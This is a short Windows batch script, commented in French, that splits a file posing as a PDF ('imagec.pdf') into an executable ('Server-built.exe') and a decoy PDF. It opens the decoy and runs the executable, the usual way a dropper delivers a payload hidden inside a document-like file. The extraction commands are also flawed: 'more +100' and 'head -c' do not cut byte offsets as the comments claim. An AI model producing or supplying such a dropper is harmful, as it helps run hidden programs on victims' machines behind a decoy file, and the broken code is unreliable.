@echo off
setlocal enabledelayedexpansion

:: Chemin du fichier combiné
set "file=imagec.pdf"

:: Extraction du .exe (entre l’offset A et B)
echo Extraction du EXE...
more +100 %file% > Server-built.exe

:: Extraction du .jpg ou .pdf (les premières lignes si tu veux)
echo Extraction du PDF...
head -c 100 %file% > rtyfughgh.pdf

:: Lancer les fichiers extraits
start "" rtyfughgh.pdf
start "" Server-built.exe
exit